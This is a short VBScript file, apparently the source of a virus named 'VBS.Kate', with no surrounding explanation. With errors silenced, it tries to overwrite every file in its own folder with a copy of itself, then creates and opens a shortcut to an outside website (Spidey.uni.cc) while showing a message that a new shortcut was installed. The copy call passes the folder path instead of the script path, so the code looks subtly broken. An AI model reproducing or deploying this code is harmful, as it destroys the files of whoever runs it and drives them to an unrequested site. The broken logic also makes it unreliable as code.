'VBS.Kate
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set Shell = Wscript.CreateObject("Wscript.Shell")
Script = Wscript.ScriptFullName
aPath = Left(Script, InStrRev(Script, "\"))
Shit = Fso.GetFolder(aPath)
For Each Target in Shit.Files
Fso.CopyFile aPath, Target.Name,1
Next
If Minute(Now()) then
Wscript.Echo "New shortcut has been intalled"
Set Links = Shell.CreateShortcut("Spidey.URL")
Links.TargetPath = "http://Spidey.uni.cc"
Links.Save
Shell.Run("Spidey.URL")
End if